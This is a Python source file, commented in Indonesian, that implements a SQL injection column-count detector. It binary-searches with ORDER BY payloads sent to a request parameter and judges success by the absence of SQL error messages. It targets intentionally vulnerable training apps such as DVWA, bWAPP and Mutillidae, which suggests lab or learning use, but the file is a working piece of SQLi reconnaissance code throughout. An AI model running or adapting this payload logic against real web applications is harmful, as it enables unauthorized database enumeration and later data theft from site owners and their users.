import requests
import re
from typing import Optional


class ColumnDetector:
    """Mendeteksi jumlah kolom dalam query"""
    
    def __init__(self, app_config, param_name, base_value="1"):
        self.app_config = app_config      # Bisa DVWAConfig atau dict
        self.param_name = param_name
        self.base_value = base_value
        self.discovered_columns = None
    
    def detect_column_count(self, max_columns=30) -> Optional[int]:
        """
        Binary search untuk menemukan jumlah kolom

        Teknik: ORDER BY n
        - ORDER BY 1 ✓
        - ORDER BY 2 ✓
        - ORDER BY 3 ✓
        - ORDER BY 4 ✗ (error)
        → 3 columns
        """
        low, high = 1, max_columns
        valid_columns = 1
        
        while low <= high:
            mid = (low + high) // 2
            test_payload = f"{self.base_value}' ORDER BY {mid} --"
            response = self._send_payload(test_payload)
            
            if self._is_valid_response(response):
                valid_columns = mid
                low = mid + 1
            else:
                high = mid - 1
        
        self.discovered_columns = valid_columns
        print(f"[+] Ditemukan {valid_columns} kolom")
        return valid_columns

    # ================= HELPER INTERNAL =================

    def _get_target_url(self) -> str:
        """Ambil URL target SQLi dari app_config (DVWAConfig atau dict)."""
        # DVWAConfig / object dengan base_url
        if hasattr(self.app_config, "base_url"):
            base = self.app_config.base_url.rstrip("/")
            cls_name = self.app_config.__class__.__name__
            # DVWA SQLi
            if cls_name == "DVWAConfig":
                return f"{base}/vulnerabilities/sqli/"
            # bWAPP SQLi
            if cls_name == "BWAPPConfig":
                return f"{base}/sqli_1.php"
            # Mutillidae
            if cls_name == "MutillidaeConfig":
                return f"{base}/index.php?page=user-info.php"
            return base
        
        # Dict config lama
        if isinstance(self.app_config, dict):
            return self.app_config.get("url", "")
        
        # Fallback
        return ""

    def _send_payload(self, payload: str):
        """Kirim payload SQLi untuk deteksi kolom."""
        url = self._get_target_url()
        params = {self.param_name: payload}

        # 1) Kalau DVWAConfig punya send_payload(), pakai itu
        if hasattr(self.app_config, "send_payload"):
            try:
                # DVWAConfig.send_payload mengembalikan response.text,
                # tapi _is_valid_response mengharapkan object mirip Response.
                # Jadi bungkus manual.
                text = self.app_config.send_payload(url, self.param_name, payload)
                class _FakeResp:
                    def __init__(self, t): self.text = t
                return _FakeResp(text)
            except Exception:
                return None

        # 2) Kalau object punya session + base_url (DVWAConfig style)
        if hasattr(self.app_config, "session") and hasattr(self.app_config, "base_url"):
            try:
                r = self.app_config.session.get(url, params=params, timeout=5)
                return r
            except Exception:
                return None

        # 3) Kalau dict config (session/cookies/raw)
        if isinstance(self.app_config, dict):
            method = self.app_config.get("method", "GET")
            session = self.app_config.get("session")
            cookies = self.app_config.get("cookies")

            try:
                if session is not None:
                    if method.upper() == "GET":
                        return session.get(url, params=params, timeout=5)
                    else:
                        return session.post(url, data=params, timeout=5)
                elif cookies is not None:
                    if method.upper() == "GET":
                        return requests.get(
                            url, params=params, cookies=cookies, timeout=5
                        )
                    else:
                        return requests.post(
                            url, data=params, cookies=cookies, timeout=5
                        )
                else:
                    if method.upper() == "GET":
                        return requests.get(url, params=params, timeout=5)
                    else:
                        return requests.post(url, data=params, timeout=5)
            except Exception:
                return None

        # 4) Tipe lain: tidak didukung
        return None
    
    def _is_valid_response(self, response) -> bool:
        if response is None:
            return False
        
        error_patterns = [
            r"SQL syntax",
            r"Column '\d+' doesn't exist",
            r"Unknown column",
            r"invalid position",
            r"out of range",
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                return False
        
        return True
